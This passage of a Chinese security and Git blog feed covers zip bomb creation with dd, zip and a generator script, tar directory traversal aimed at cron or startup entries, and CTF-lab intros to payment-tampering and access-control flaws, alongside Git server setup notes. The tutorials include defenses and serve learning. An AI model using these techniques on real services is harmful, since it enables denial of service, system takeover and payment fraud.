<p>损失的代价是: <strong>无法从被压缩的文件还原出压缩前的文件</strong>，媒体资源文件(图片、音乐、视频等)早期为了更小的存储和更快的传输，需要一个高压缩比的压缩方法，虽然解压后的还原度达不到100%，但是相对于资源使用是可以忽略不记得，比如我们常见的jpg、MP3、MP4格式都是原始数据经过有损压缩</p>
</li>
<li><p>无损压缩</p>
<p>相对于有损压缩，无损压缩的压缩率较低，有的类型数据是需要完全还原最开始的样子，这样我们就要使用无损压缩了</p>
</li>
</ul>
<h3 id="炸弹DEMO"><a href="#炸弹DEMO" class="headerlink" title="炸弹DEMO"></a>炸弹DEMO</h3><ul>
<li>一个初始大小只要42kb的<code>zip</code>的压缩包，解压后足足有4.5PB</li>
<li>一个droste.zip 文件，大小为 28 KB，一旦被打开了以后，就会无限解压缩生成一份同样的文件</li>
</ul>
<p>灵感取自于德罗斯特效应</p>
<p><img data-src="./%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/1.png" alt></p>
<h3 id="制作"><a href="#制作" class="headerlink" title="制作"></a>制作</h3><h4 id="dd指令"><a href="#dd指令" class="headerlink" title="dd指令"></a>dd指令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dd if=/dev/zero count=$((1024*1024)) bs=4096 of=bomb_file.txt</span><br><span class="line"></span><br><span class="line">命令解释：</span><br><span class="line">if=源文件名 如果没有文件内容要求，可以指定为系统自带的0源文件，制作好的文件内容也会是0</span><br><span class="line">count=blocks 拷贝blocks个数据块，块大小取决于bs或ibs指定的字节数</span><br><span class="line">bs=bytes 同时设置输入/输出的数据块大小是bytes个字节</span><br><span class="line">of=输出文件名，自己任取</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@KALI:~/laotie# dd if=/dev/zero count=$((1024*1024)) bs=4096 of=bomb_file.txt</span><br><span class="line">记录了1048576+0 的读入</span><br><span class="line">记录了1048576+0 的写出</span><br><span class="line">4294967296 bytes (4.3 GB, 4.0 GiB) copied, 15.1402 s, 284 MB/s</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip -9 bomb_file.zip bomb_file.txt</span><br><span class="line"></span><br><span class="line">命令解释：</span><br><span class="line">-9：设置压缩级别，9最大，1最小</span><br><span class="line">bombfile.zip：输出压缩文件名</span><br><span class="line">bombfile.txt：压缩源文件</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@KALI:~/laotie# zip -9 bomb_file.zip bomb_file.txt</span><br><span class="line">  adding: bomb_file.txt (deflated 100%)</span><br></pre></td></tr></table></figure>

<ul>
<li>查看属性</li>
</ul>
<p><img data-src="./%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/2.png" alt></p>
<h4 id="zipbomb-generator"><a href="#zipbomb-generator" class="headerlink" title="zipbomb-generator"></a>zipbomb-generator</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用脚本生成炸弹 https://github.com/CreeperKong/zipbomb-generator</span></span><br><span class="line">python3 zipbomb.py --mode=quoted_overlap --num-files=250 --compressed-size=21179 &gt; bomb.zip</span><br><span class="line"></span><br><span class="line">–num-files ：压缩包包含的文件数量</span><br><span class="line">–compressed-size：文件压缩大小</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看解压后的大小</span></span><br><span class="line">python3 ratio.py bomb.zip</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@KALI:~/laotie/zipbomb-generator-master# python3 ratio.py bomb.zip</span><br><span class="line">bomb.zip        5461307620 / 42374      128883.45730872705      +51.102 dB  </span><br><span class="line">42K -&gt; 5.4G</span><br></pre></td></tr></table></figure>

<h3 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h3><p>​    早期病毒制作者利用杀毒软件会扫描压缩文件内部的特性，会把 ZIP 炸弹连带病毒一起发到目标电脑上。由于ZIP 炸弹表面上看起来很小，易于传输，但实际上扫描起来非常花时间，此时趁着杀毒软件忙着扫描 4.5 PB 的数据，被占用时，病毒软件就可以做到免杀进入</p>
<p>​    现在很多杀毒软件已经有办法避开这种 zip 炸弹的佯攻</p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>​    上传文件限制文件的大小、格式等，判断解压需要的大小后，再进行解压操作</p>
<h2 id="目录穿越覆盖"><a href="#目录穿越覆盖" class="headerlink" title="目录穿越覆盖"></a>目录穿越覆盖</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>​    讲道理，正常压缩包解压后的文件只能在当前文件夹存在，如果能够目录穿越覆盖到其他文件夹，就会造成很大危害</p>
<ul>
<li>穿越到linux定时任务，getshell</li>
<li>穿越到windows启动项，电脑重启后getshell</li>
</ul>
<p>​    winrar、2345等软件都曾爆出过解压目录穿越问题，危害较大，恶意压缩包可造成系统变为肉鸡，本文主要结合<strong>太湖杯web题（CrossFire）</strong>说明linux下的此问题</p>
<p>​    业务场景中，升级需要上传压缩包，如果后端对升级解压逻辑处理不当，会造成系统沦陷问题</p>
<h3 id="Linux解压"><a href="#Linux解压" class="headerlink" title="Linux解压"></a>Linux解压</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 生成 tar 压缩包</span></span><br><span class="line">tar cPvf caiji.tar ../caiji.txt</span><br><span class="line"></span><br><span class="line">-c 或 --create 建立新的备份文件</span><br><span class="line">-P 或 --absolute-names 文件名使用绝对名称，不移除文件名称前的"/"号</span><br><span class="line">-v 或 --verbose 显示指令执行过程</span><br><span class="line">-f &lt;备份文件&gt; 或 --file=&lt;备份文件&gt; 指定备份文件</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@KALI:~/laotie/test# tar cPvf caiji.tar ../caiji.txt</span><br><span class="line">../caiji.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压命令</span></span><br><span class="line">tar xf caiji.tar</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@KALI:~/laotie/test/test2# tar xf caiji.tar</span><br><span class="line">tar: 从成员名中删除开头的“../”</span><br><span class="line">tar: ../caiji.txt: Member name contains '..'</span><br><span class="line">tar: 由于前次错误，将以上次的错误状态退出</span><br></pre></td></tr></table></figure>

<ul>
<li><code>Linux</code>下解压(使用的是GNU的tar)，默认情况下，tar会自动把前面的<code>/</code>去掉，然后在当前目录解压</li>
<li><code>Unix</code>则不然，会依照绝对路径解压，对路径中的其他文件不影响，对相同的文件，覆盖。如果不存在某个目录，则创建(如果有权限)</li>
</ul>
<p><img data-src="./%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/3.png" alt></p>
<p>贴一段<code>python</code>代码(采用<code>unix</code>方式解压)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tar.py</span></span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># tar = tarfile.open(sys.argv[1], "r")</span></span><br><span class="line">tar = tarfile.open(<span class="string">"./caiji.tar"</span>, <span class="string">"r"</span>)</span><br><span class="line">tar.extractall() <span class="comment"># 解压缩包</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AE%89%E5%85%A8%E6%B5%85%E6%9E%90/4.png" alt></p>
<p>如果后端采用这种方式进行解压，即可进行目录穿越</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>压缩包安全</tag>
        <tag>炸弹</tag>
        <tag>覆盖</tag>
      </tags>
  </entry>
  <entry>
    <title>支付漏洞入门</title>
    <url>/2020/11/02/blog_formal/security/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="支付漏洞入门"><a href="#支付漏洞入门" class="headerlink" title="支付漏洞入门"></a>支付漏洞入门</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    支付漏洞的理解通常都是篡改价格、数量、user_id等前端传参，从而造成小钱够买大物，本质上是一种逻辑漏洞。比如，一分钱买任何东西。少收款、企业收费产品被免费使用，直接造成企业的经济损失，漏洞危害较大。</p>
<p>​    由于是逻辑漏洞，需要攻击者多一些发散思维，想出开发没能够想到的思维漏洞点，不走寻常路，达到事半功倍的效果</p>
<a id="more"></a>

<h2 id="商家接入支付方式"><a href="#商家接入支付方式" class="headerlink" title="商家接入支付方式"></a>商家接入支付方式</h2><p>这里介绍两种商户网站接入支付结果的方式</p>
<ul>
<li>浏览器跳转 - 基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知，导致支付结果难以处理。而且浏览器端数据很容易被篡改而降低安全性(这种方式数据经过了客户端浏览器，极大的可能性被第三方恶意修改)</li>
<li>服务器后台异步同步 - 该方式是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用POST或GET的方式。商户网站接收异部参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额、订单信息是否与发起支付时一致，验证正常则对订单进行状态处理或为用户进行网站内入账等</li>
</ul>
<h2 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h2><ul>
<li>修改支付的价格 - 大多支付流程会经过订购、订单、付款三个阶段，三个阶段可以分别修改支付价格，测试是否能绕过后端限制，有时候前两个阶段后端校验严格，但是最后一个阶段后端绕过也可能造成支付漏洞</li>
<li>修改支付状态 - 订单的状态分为未完成、完成，测试的时候测试能够将A完成的订单修改为B商品，从而用小价钱购买贵的商品</li>
<li>修改订单数量 - 后端如果对数量没有做严格校验会造成支付漏洞。例如，购买<code>-100</code>个笔，是不是余额就会增加</li>
<li>修改附属值 - 例如，修改优惠券的数量，将优惠券数量加大，从而获取更高减免，甚至绕过商品对优惠券使用数量的限制</li>
<li>越权支付 - 例如，修改user=id(123)，尝试改改id，尝试用别人的钱包买自己的商品</li>
<li>无限制试用 - 例如，试用的参数为2，正常购买的参数为1，将购买参数抓包修改为 2， 测试是否能无限次适用</li>
</ul>
<h2 id="挖掘方法"><a href="#挖掘方法" class="headerlink" title="挖掘方法"></a>挖掘方法</h2><ul>
<li>找到关键的数据包，一个支付操作有三四个数据包，要对数据包进行挑选</li>
<li>分析数据包，支付数据包中会包含很多的敏感信息(账号，金额，余额，优惠)，尝试对数据包中的各个参数进行分析</li>
<li>发散思维，不要按套路出牌</li>
</ul>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ul>
<li>后端检查每一项值，包括支付状态等</li>
<li>校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量</li>
<li>与第三方支付平台检查，实际支付的金额是否与订单金额一致</li>
<li>支付参数进行MD5 加密、解密、数字签名及验证，避免数据修改，重放攻击</li>
<li>金额超过阈值，进行人工审核(将金额设置成一个合理的范围)</li>
</ul>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h3><ul>
<li>登入靶场，注册登录</li>
</ul>
<p><img data-src="./%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/1.png" alt></p>
<ul>
<li>修改商品数量为负数</li>
</ul>
<p><img data-src="./%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/2.png" alt></p>
<ul>
<li>支付商品</li>
</ul>
<p><img data-src="./%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/3.png" alt></p>
<ul>
<li>余额++， 获取flag</li>
</ul>
<p><img data-src="./%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/4.png" alt></p>
<p><img data-src="./%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/5.png" alt></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>支付漏洞</tag>
        <tag>逻辑漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>越权问题入门</title>
    <url>/2020/11/01/blog_formal/security/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="越权问题入门"><a href="#越权问题入门" class="headerlink" title="越权问题入门"></a>越权问题入门</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    越权漏洞是一种很常见的逻辑安全漏洞。由于服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致修改相关参数就可以拥有了其他账户的增、删、查、改功能，从而导致越权漏洞</p>
<a id="more"></a>

<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>越权漏洞可以分为以下三类</p>
<ul>
<li>水平越权(横向越权操作)：相同权限下不同的用户可以互相访问</li>
<li>垂直越权(纵向越权操作)：使用权限低的用户可以访问到权限较高的用户</li>
<li>交叉越权(水平越权+垂直越权)</li>
</ul>
<h2 id="常见越权点"><a href="#常见越权点" class="headerlink" title="常见越权点"></a>常见越权点</h2><ul>
<li>修改GET传参进行越权</li>
<li>修改POST传参进行越权</li>
<li>修改cookie传参进行越权</li>
<li>未授权访问：严格意义上不属于越权问题，是由于开发编码过程中未对某些页面进行权限校验导致，任意用户不需要登录就可以查看相关页面</li>
</ul>
<h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><ul>
<li>敏感传参值(ID参数，eg：uid=  id= user= 等)进行替换，看能否查询到高权限or同级权限的数据信息</li>
<li>登录不同的账号，通过BP工具修改对应的<code>cookie</code>值，点击页面，查看接口能否访问成功</li>
<li>实际工作中，本菜鸡是寻找<code>get_user</code>接口，修改其返回值为其他(水平or垂直)用户，测试能否进行操作</li>
</ul>
<h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><ul>
<li>接口对身份权限进行再一次认证，如Flask 框架添加装饰器等</li>
<li>用户信息在后台获取(session中等)，防止前端进行假冒，前端对用户标识不可控</li>
<li>特别敏感操作可以让用户再次输入密码或其他的验证信息(手机验证码、指纹)</li>
</ul>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h3><ul>
<li>注册账号</li>
</ul>
<p><img data-src="./%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98%E5%85%A5%E9%97%A8/1.png" alt></p>
<ul>
<li>修改cookie 如图</li>
</ul>
<p><img data-src="./%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98%E5%85%A5%E9%97%A8/2.png" alt></p>
<ul>
<li>成功获取flag</li>
</ul>
<p><img data-src="./%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98%E5%85%A5%E9%97%A8/3.png" alt></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>逻辑漏洞</tag>
        <tag>越权</tag>
      </tags>
  </entry>
  <entry>
    <title>Git Server环境搭建</title>
    <url>/2020/03/24/blog_formal/%E5%BC%80%E5%8F%91/git/git_server/</url>
    <content><![CDATA[<h1 id="Git-个人服务器搭建"><a href="#Git-个人服务器搭建" class="headerlink" title="Git 个人服务器搭建"></a>Git 个人服务器搭建</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>GitHub就是一个免费托管开源代码的远程仓库。同样，我们也可以像Github那样搭建自己的Git服务器。</p>
<p>前提需要一台运行Linux的机器(Ubuntu或Debian)，本文通过<code>yum</code>搭建一个Git个人服务器(同理，你也可以通过<code>apt</code>指令)</p>
<a id="more"></a>

<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">第一步 安装git:</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo yum install git -y</span></span><br><span class="line"></span><br><span class="line">第二步，创建一个git用户，用来运行git服务：</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo adduser git</span></span><br><span class="line"></span><br><span class="line">第三步，创建证书登录：</span><br><span class="line">收集所有需要登录的用户的公钥，就是他们自己的id_rsa.pub文件，把所有公钥导入到/home/git/.ssh/authorized_keys文件里，一行一个</span><br><span class="line">eg:</span><br><span class="line">	[root@instance-t6n4w8xd .ssh]# pwd</span><br><span class="line">	/home/git/.ssh</span><br><span class="line">	[root@instance-t6n4w8xd .ssh]# ll</span><br><span class="line">	总用量 0</span><br><span class="line">	-rw-r--r-- 1 root root 0 2月   1 15:46 authorized_keys	</span><br><span class="line">    </span><br><span class="line">第四步，初始化Git仓库：</span><br><span class="line">选定一个目录作为Git仓库，假定是/home/git/sample.git，在/home/git目录下输入命令：</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo git init --bare sample.git</span></span><br><span class="line">eg:</span><br><span class="line">	[root@instance-t6n4w8xd git]# sudo git init --bare sample.git</span><br><span class="line">    初始化空的 Git 版本库于 /home/git/sample.git/</span><br><span class="line">    [root@instance-t6n4w8xd git]# ll</span><br><span class="line">    总用量 4</span><br><span class="line">    drwxr-xr-x 7 root root 4096 2月   1 15:49 sample.git</span><br><span class="line">    [root@instance-t6n4w8xd git]# pwd</span><br><span class="line">    /home/git</span><br><span class="line"></span><br><span class="line">备注：Git会创建一个裸仓库，裸仓库没有工作区，因为服务器上的Git仓库纯粹是为了共享，用户不可以直接登录到服务器上去改工作区，并且服务器上的Git仓库通常都以.git结尾</span><br><span class="line"></span><br><span class="line">第五步 把刚刚仓库owner改为git：</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chown -R git:git sample.git</span></span><br><span class="line"></span><br><span class="line">备注：将目前目录下的所有文件与子目录的拥有者皆设为runoob，群体的使用者runoobgroup:</span><br><span class="line">chown -R runoob:runoobgroup *</span><br><span class="line"></span><br><span class="line">第六步，禁用shell登录：</span><br><span class="line">为了安全，第二步创建的git用户不允许登录shell，编辑/etc/passwd文件</span><br><span class="line">git:x:1000:1000:,,,:/home/git:/bin/bash</span><br><span class="line">改为：</span><br><span class="line">git:x:1000:1000:,,,:/home/git:/usr/bin/git-shell</span><br><span class="line">这样，git用户可以正常通过ssh使用git，但无法登录shell，因为我们为git用户指定的git-shell每次一登录就自动退出。</span><br></pre></td></tr></table></figure>

<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">第一步 安装git(同理):</span><br><span class="line"></span><br><span class="line">第二步 创建私钥并且将私钥拷贝到服务器(服务器第三步):</span><br><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen -t rsa -C <span class="string">"youremail@example.com"</span></span></span><br><span class="line">备注：文件位于用户主目录里找到.ssh目录，里面有id_rsa和id_rsa.pub两个文件</span><br><span class="line"></span><br><span class="line">第三步 git clone git@yourserver:/home/git/sample.git</span><br><span class="line">eg:</span><br><span class="line">    root@caixin:/home/caixin/test# git clone git@xxx.xxx.xxx.xxx:/home/git/sample.git</span><br><span class="line">    正克隆到 'sample'...</span><br><span class="line">    The authenticity of host 'xxx.xxx.xxx.xxx (xxx.xxx.xxx.xxx)' can't be established.</span><br><span class="line">    ECDSA key fingerprint is SHA256:P????xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.</span><br><span class="line">    Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">    Warning: Permanently added 'xxx.xxx.xxx.xxx' (ECDSA) to the list of known hosts.</span><br><span class="line">    warning: 您似乎克隆了一个空仓库。</span><br><span class="line"></span><br><span class="line">结束，之后就是愉快的管理自己的代码了</span><br></pre></td></tr></table></figure>

<h3 id="源码查看"><a href="#源码查看" class="headerlink" title="源码查看"></a>源码查看</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 这样子服务器端是没有代码的 只能进行多人合作</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解决方法</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 可以在 git hooks文件夹中 修改 post-update 文件如下</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[root@VM_0_3_centos hooks]# cat post-update </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> An example hook script to prepare a packed repository <span class="keyword">for</span> use over</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> dumb transports.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> To <span class="built_in">enable</span> this hook, rename this file to <span class="string">"post-update"</span>.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">exec</span> git update-server-info</span></span><br><span class="line">WORK_TREE='yourcodepath'</span><br><span class="line">git  --work-tree="$&#123;WORK_TREE&#125;" reset --hard</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这样做每次更新代码都会同步到 WORK_TREE 文件夹下了</span></span><br></pre></td></tr></table></figure>

<h3 id="更换ssh端口后的操作"><a href="#更换ssh端口后的操作" class="headerlink" title="更换ssh端口后的操作"></a>更换ssh端口后的操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">找到项目下的.git/config文件，修改</span><br><span class="line"></span><br><span class="line">url = ssh://git@ip:port/home/test.git</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>git随笔</title>
    <url>/2020/09/24/blog_formal/%E5%BC%80%E5%8F%91/git/git%E6%9D%82%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Git随笔"><a href="#Git随笔" class="headerlink" title="Git随笔"></a>Git随笔</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    介绍<code>git</code>使用中的一些坑坑和技巧</p>
<a id="more"></a>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 当一个git目录下面包含一个git目录时，外层的git仓git add git commit 提交的时候，并没有把内层的git仓一同提交上去</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解决方法 外层 git 使用</span></span><br><span class="line">git rm -rf --cached path</span><br><span class="line">eg:</span><br><span class="line">git rm -rf --cached ./themes/next/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 然后 </span></span><br><span class="line">git add path</span><br><span class="line">git commit &amp;&amp; git push</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 出现 Pathspec <span class="string">'xxx'</span> is <span class="keyword">in</span> submodule 多多关注 .gitignore 文件</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>Git 基础知识</title>
    <url>/2019/06/24/blog_formal/%E5%BC%80%E5%8F%91/git/git%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="git学习"><a href="#git学习" class="headerlink" title="git学习"></a>git学习</h1><p>   早年的git知识整理，基础知识的笔记</p>
<a id="more"></a>

<h2 id="第〇部分-写在前面的一些总结"><a href="#第〇部分-写在前面的一些总结" class="headerlink" title="第〇部分 写在前面的一些总结"></a>第〇部分 写在前面的一些总结</h2><h3 id="版本管理库出现前"><a href="#版本管理库出现前" class="headerlink" title="版本管理库出现前"></a>版本管理库出现前</h3><ul>
<li>用目录区分不同版本</li>
<li>公共文件容易被覆盖<h3 id="企业的标准开发流程"><a href="#企业的标准开发流程" class="headerlink" title="企业的标准开发流程"></a>企业的标准开发流程</h3></li>
</ul>
<p><img data-src="./git%E5%AD%A6%E4%B9%A0/1.png" alt></p>
<h3 id="两种代码管理库的对比"><a href="#两种代码管理库的对比" class="headerlink" title="两种代码管理库的对比"></a>两种代码管理库的对比</h3><h4 id="SVN"><a href="#SVN" class="headerlink" title="SVN"></a>SVN</h4><ul>
<li>集中式</li>
<li>不支持离线操作</li>
<li>分支管理复杂(拷贝)</li>
<li>简单，容易上手<h4 id="GIT-本次教程讲述内容"><a href="#GIT-本次教程讲述内容" class="headerlink" title="GIT(本次教程讲述内容)"></a>GIT(本次教程讲述内容)</h4></li>
<li>分布式</li>
<li>支持离线操作</li>
<li>分支功能简单(C语言链表)</li>
<li>有一定的学习难度</li>
</ul>
<hr>
<h2 id="第一部分-简单入门"><a href="#第一部分-简单入门" class="headerlink" title="第一部分 简单入门"></a>第一部分 简单入门</h2><h3 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h3><p> 1.找到一个合适的地方创建空文件夹</p>
<pre><code>$ mkdir learngit
$ cd learngit
$ pwd</code></pre><hr>
<p> 2.目录变成Git可以管理的仓库<br>    git init</p>
<hr>
<p> 3.添加文件到Git仓库，两步</p>
<pre><code>//*** Please tell me who you are.
//Run
//git config --global user.email &quot;you@example.com&quot;

//git config --global user.name &quot;Your Name&quot;
//1.使用命令git add &lt;file&gt;，注意，可反复多次使用，添加多个文件；
//2.使用命令git commit -m &lt;message&gt;，完成。

&apos;&apos;&apos;
$ git add readme.txt
$ git commit -m &quot;wrote a readme file&quot;
[master (root-commit) eaadf4e] wrote a readme file
 1 file changed, 2 insertions(+)
 create mode 100644 readme.txt

// --------------
$ git add file1.txt
$ git add file2.txt file3.txt
$ git commit -m &quot;add 3 files.&quot;
&apos;&apos;&apos;</code></pre><hr>
<h2 id="第二部分-时间机器"><a href="#第二部分-时间机器" class="headerlink" title="第二部分 时间机器"></a>第二部分 时间机器</h2><p>###版本回退<br>####一些指令</p>
<pre><code>&apos;&apos;&apos;
git log // 查看历史记录 

// 如果嫌输出信息太多，看得眼花缭乱的，可以试试加上--pretty=oneline参数
git log --pretty=oneline 


&apos;&apos;&apos;</code></pre><p>在Git中，用HEAD表示当前版本，也就是最新的提交1094adb…（注意每个人的提交ID不一样）</p>
<p>上一个版本就是HEAD^，上上一个版本就是HEAD^^，</p>
<p>当然往上100个版本写100个^比较容易数不过来，所以写成HEAD~100。</p>
<h5 id="版本回退-git-reset"><a href="#版本回退-git-reset" class="headerlink" title="版本回退 git reset"></a>版本回退 git reset</h5><pre><code>&apos;&apos;&apos;
git reset --hard HEAD^
&apos;&apos;&apos;</code></pre><h5 id="回退后想复原"><a href="#回退后想复原" class="headerlink" title="回退后想复原"></a>回退后想复原</h5><p>最新的那个版本append GPL已经看不到了！好比你从21世纪坐时光穿梭机来到了19世纪，想再回去已经回不去了，肿么办？</p>
<p>办法其实还是有的，只要上面的命令行窗口还没有被关掉，你就可以顺着往上找啊找啊，找到那个提交版本的commit id是xxxxxx…，于是就可以指定回到未来的某个版本：</p>
<pre><code>&apos;&apos;&apos;
git reset --hard 
// $ git reset --hard 62295
// HEAD is now at 6229521 222222222222222
// 版本号没必要写全，前几位就可以了，Git会自动去找。当然也不能只写前一两位，
// 因为Git可能会找到多个版本号，就无法确定是哪一个了。
&apos;&apos;&apos;</code></pre><h5 id="git-reflog-指令"><a href="#git-reflog-指令" class="headerlink" title="git reflog 指令"></a>git reflog 指令</h5><p>用来记录你的每一次命令 </p>
<p>eg：第一天回退上一版本 关了git命令行窗口 第二天我们想回退到最新版本 通过此方法可以找到最新版本的  <strong>commit id</strong></p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
<li><p>HEAD指向的版本就是当前版本，Git允许我们在版本的历史之间穿梭，使用命令git reset –hard commit_id。</p>
</li>
<li><p>穿梭前，用git log可以查看提交历史，以便确定要回退到哪个版本。</p>
</li>
<li><p>要重返未来，用git reflog查看命令历史，以便确定要回到未来的哪个版本。</p>
</li>
</ul>
<h3 id="工作区和暂存区"><a href="#工作区和暂存区" class="headerlink" title="工作区和暂存区"></a>工作区和暂存区</h3><h4 id="Git和其他版本控制系统如SVN的一个不同之处就是有暂存区的概念"><a href="#Git和其他版本控制系统如SVN的一个不同之处就是有暂存区的概念" class="headerlink" title="Git和其他版本控制系统如SVN的一个不同之处就是有暂存区的概念"></a>Git和其他版本控制系统如SVN的一个不同之处就是有暂存区的概念</h4><h4 id="工作区-（Working-Directory）"><a href="#工作区-（Working-Directory）" class="headerlink" title="工作区 （Working Directory）"></a>工作区 （Working Directory）</h4><p>就是在电脑里能看到的目录 (隐藏文件 .git不是工作区)</p>
<h4 id="版本库（Repository）"><a href="#版本库（Repository）" class="headerlink" title="版本库（Repository）"></a>版本库（Repository）</h4><p>工作区有一个隐藏目录.git，这个不算工作区，而是Git的版本库。</p>
